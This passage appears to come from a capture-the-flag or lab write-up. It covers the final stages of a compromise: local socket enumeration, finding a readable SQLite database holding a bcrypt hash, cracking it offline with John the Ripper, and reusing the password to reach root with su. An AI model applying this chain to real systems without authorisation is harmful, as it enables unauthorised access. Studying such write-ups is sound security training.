4. **Internal Enumeration**: Post-login socket enumeration (`ss -tlpn`) revealed a locally bound web server on port 80. The web root contained a world-readable SQLite database (`atom-2400-database.db`) storing a bcrypt-hashed password for the `atom` user.

5. **Privilege Escalation**: The bcrypt hash was cracked offline with John the Ripper in ~2 seconds. The recovered password was the `root` account's system password, enabling direct privilege escalation via `su - root` — achieving a full root shell and both flags.
